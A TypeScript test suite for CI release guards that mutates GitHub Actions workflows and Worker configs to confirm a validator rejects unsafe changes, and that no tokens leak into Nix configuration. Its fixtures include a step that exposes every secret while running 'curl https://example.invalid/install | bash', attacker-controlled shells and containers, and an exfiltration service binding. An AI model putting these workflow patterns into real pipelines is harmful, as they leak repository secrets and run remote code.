import { afterAll, describe, expect, test } from 'bun:test';
import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const root = join(import.meta.dir, '../..');
const scratch = mkdtempSync(join(tmpdir(), 'g23-release-'));
afterAll(() => rmSync(scratch, { recursive: true, force: true }));

function workflow(file: string): any {
  const parsed = Bun.spawnSync(['yq', '-o=json', '.', join(root, file)]);
  expect(parsed.exitCode).toBe(0);
  return JSON.parse(parsed.stdout.toString());
}

function gate(change: (workflow: any) => void) {
  const folder = mkdtempSync(join(scratch, 'tree-'));
  mkdirSync(join(folder, '.github'));
  cpSync(join(root, '.github/workflows'), join(folder, '.github/workflows'), { recursive: true });
  cpSync(join(root, '.releaserc.yaml'), join(folder, '.releaserc.yaml'));
  const file = '.github/workflows/relay-hosted.yaml';
  const data = workflow(file);
  change(data);
  writeFileSync(join(folder, file), JSON.stringify(data));
  return Bun.spawnSync(['bash', join(root, 'scripts/validate/release-guards.sh'), '--root', folder]);
}

describe('E-209 token jobs require review of every execution surface', () => {
  const mutations: Record<string, (job: any, data: any) => void> = {
    'step shell': job => {
      job.steps[0].shell = 'npx -y attacker {0}';
    },
    'job shell': job => {
      job.defaults = { run: { shell: 'node {0}' } };
    },
    'workflow shell': (_job, data) => {
      data.defaults = { run: { shell: 'npx attacker {0}' } };
    },
    container: job => {
      job.container = 'attacker:latest';
    },
    services: job => {
      job.services = { attacker: { image: 'attacker:latest' } };
    },
    'prefixed execution': job => {
      job.steps.push({ run: 'FOO=1 command wrangler deploy --config attacker.json' });
    },
    'alternate package runner': job => {
      job.steps.push({ run: 'pnpm dlx attacker' });
    },
    'renamed spaced secret': (job, data) => {
      const holder = {
        ...job,
        steps: [{ env: { TOKEN: '${{ toJSON ( secrets ) }}' }, run: 'curl https://example.invalid/install | bash' }],
      };
      data.jobs.unreviewed = holder;
    },
    'a deployment secret with the GITHUB_TOKEN prefix': (job, data) => {
      data.jobs.unreviewed = {
        ...job,
        steps: [{ env: { TOKEN: '${{ secrets.GITHUB_TOKEN_DEPLOY }}' }, run: 'echo synthetic' }],
      };
    },
    'a branch condition that escapes the main guard': job => {
      job.if = "github.ref == 'refs/heads/main' || github.event_name == 'pull_request'";
    },
  };
  for (const [name, mutate] of Object.entries(mutations)) {
    test(name, () => {
      const result = gate(data => mutate(data.jobs.deploy, data));
      expect(result.exitCode, result.stderr.toString()).toBe(1);
    }, 120_000);
  }
});

describe('E-224 the actual artifact verifier refuses unrelated Worker resources', () => {
  const cases = [
    [
      'relay-hosted.yaml',
      'packages/plugins/connections/worker/wrangler.hosted.json',
      'relay-bundle',
      'wrangler.hosted.json',
    ],
    [
      'link-store-hosted.yaml',
      'packages/plugins/catalogs/worker/wrangler.link-store.hosted.json',
      'link-store-bundle',
      'wrangler.link-store.hosted.json',
    ],
  ];
  for (const [name, source, bundle, config] of cases) {
    test(name ?? '', () => {
      const data = workflow(`.github/workflows/${name}`);
      const verify = data.jobs.deploy.steps.find((step: any) => step.name === 'Verify the handed-over bundle');
      const runner = mkdtempSync(join(scratch, 'runner-'));
      const folder = join(runner, bundle ?? '');
      mkdirSync(folder);
      writeFileSync(join(folder, 'worker.js'), 'export default {};');
      if (name === 'relay-hosted.yaml') writeFileSync(join(folder, 'fingerprint'), 'synthetic-fingerprint');
      const pristine = { ...JSON.parse(readFileSync(join(root, source ?? ''), 'utf8')), main: 'worker.js' };
      const run = (value: unknown) => {
        writeFileSync(join(folder, config ?? ''), JSON.stringify(value));
        return Bun.spawnSync(['bash', '-c', verify.run], {
          env: { ...process.env, ...data.env, RUNNER_TEMP: runner },
        }).exitCode;
      };
      expect(run(pristine)).toBe(0);
      const changed = structuredClone(pristine);
      changed.durable_objects.bindings[0].script_name = 'unrelated-worker';
      expect(run(changed)).toBe(1);
      expect(run({ ...pristine, services: [{ binding: 'EXFILTRATE', service: 'unrelated-worker' }] })).toBe(1);
      expect(
        run({
          ...pristine,
          migrations: [
            { tag: 'bad', transferred_classes: [{ from: 'Secret', from_script: 'unrelated-worker', to: 'Secret' }] },
          ],
        }),
      ).toBe(1);
    });
  }
});

test('E-230 warm Nix configuration carries no GitHub credential into tests', () => {
  const script = readFileSync(join(root, '.github/actions/setup-nix/scripts/linux-warm-nix.sh'), 'utf8');
  // Evaluate only definitions; bootstrap/apply/capture (and their sudo calls) are never invoked.
  const definitions = script.slice(0, script.lastIndexOf('\ncase "${1:-}" in'));
  const fixture = join(scratch, 'warm-config.sh');
  writeFileSync(fixture, `${definitions}\nwrite_custom_conf`);
  const generated = Bun.spawnSync(['bash', fixture], {
    env: {
      ...process.env,
      GITHUB_TOKEN_VALUE: 'synthetic-g23-fetch-credential',
      NIX_CONF: 'experimental-features = nix-command flakes',
    },
  });
  expect(generated.exitCode).toBe(0);
  expect(generated.stdout.toString()).not.toContain('synthetic-g23-fetch-credential');
  expect(generated.stdout.toString()).not.toContain('access-tokens');
  expect(generated.stdout.toString()).toContain('experimental-features = nix-command flakes');
});

test('E-230 installer paths disable token persistence before shell and post hooks', () => {
  const action = workflow('.github/actions/setup-nix/action.yml');
  const steps = action.runs.steps;
  const installers = steps.filter((step: any) => step.uses?.startsWith('DeterminateSystems/nix-installer-action@'));
  expect(installers.length).toBe(1);
  for (const installer of installers) expect(installer.with['github-token']).toBe('');
  const wrapper = workflow('.github/actions/install-nix/action.yml').runs.steps;
  expect(wrapper.filter((step: any) => step.uses === './.github/actions/setup-nix').length).toBe(2);
  const guard = steps.findIndex((step: any) => step.name === 'Refuse persisted Nix access tokens');
  expect(guard).toBeGreaterThan(steps.indexOf(installers[0]));
  for (const [index, step] of steps.entries()) {
    if (/Register .*hook|Pre-warm dev shells|Capture Nix install/.test(step.name ?? ''))
      expect(guard).toBeLessThan(index);
  }
  const fakeBin = mkdtempSync(join(scratch, 'nix-bin-'));
  const nix = join(fakeBin, 'nix');
  writeFileSync(nix, '#!/bin/sh\nprintf \'%s\\n\' "$FIXTURE_NIX_CONFIG"\n', { mode: 0o755 });
  for (const value of [{}, { 'github.com': 'synthetic-g23-token' }]) {
    const result = Bun.spawnSync(['bash', '-c', steps[guard]?.run ?? 'exit 99'], {
      env: {
        ...process.env,
        PATH: `${fakeBin}:${process.env.PATH}`,
        FIXTURE_NIX_CONFIG: JSON.stringify({ 'access-tokens': { value } }),
      },
    });
    expect(result.exitCode).toBe(Object.keys(value).length === 0 ? 0 : 1);
    expect(result.stdout.toString() + result.stderr.toString()).not.toContain('synthetic-g23-token');
  }
});

test('E-230 generated extra-conf and warm nix.conf contain no access-tokens line', () => {
  const steps = workflow('.github/actions/setup-nix/action.yml').runs.steps;
  const config = steps.find((step: any) => step.id === 'nixconf');
  expect(JSON.stringify(config.env)).not.toMatch(/github\.token|secrets/i);
  const output = join(scratch, 'nix-output');
  const script = readFileSync(join(root, '.github/actions/setup-nix/scripts/linux-warm-nix.sh'), 'utf8');
  const definitions = script.slice(0, script.lastIndexOf('\ncase "${1:-}" in'));
  const fixture = join(scratch, 'warm-generated.sh');
  writeFileSync(fixture, `${definitions}\nwrite_custom_conf`);
  for (const [os, namespace] of [
    ['Linux', 'true'],
    ['Linux', 'false'],
    ['macOS', 'true'],
    ['macOS', 'false'],
  ]) {
    writeFileSync(output, '');
    const result = Bun.spawnSync(['bash', '-c', config.run], {
      env: {
        ...process.env,
        RUNNER_OS: os,
        NAMESPACELABS: namespace,
        ATTIC: 'false',
        DARWIN_CACHE_PATH: '/tmp/synthetic-cache',
        GITHUB_OUTPUT: output,
        GITHUB_TOKEN: 'synthetic-g23-fetch-credential',
      },
    });
    expect(result.exitCode, result.stderr.toString()).toBe(0);
    const extraConf = readFileSync(output, 'utf8').split('\n').slice(1, -2).join('\n');
    expect(extraConf).toContain('lazy-trees = true');
    expect(extraConf).not.toMatch(/access-tokens|synthetic-g23-fetch-credential/);
    const generated = Bun.spawnSync(['bash', fixture], {
      env: { ...process.env, NIX_CONF: extraConf, GITHUB_TOKEN_VALUE: 'synthetic-g23-fetch-credential' },
    });
    expect(generated.exitCode).toBe(0);
    expect(generated.stdout.toString()).not.toMatch(/access-tokens|synthetic-g23-fetch-credential/);
  }
});
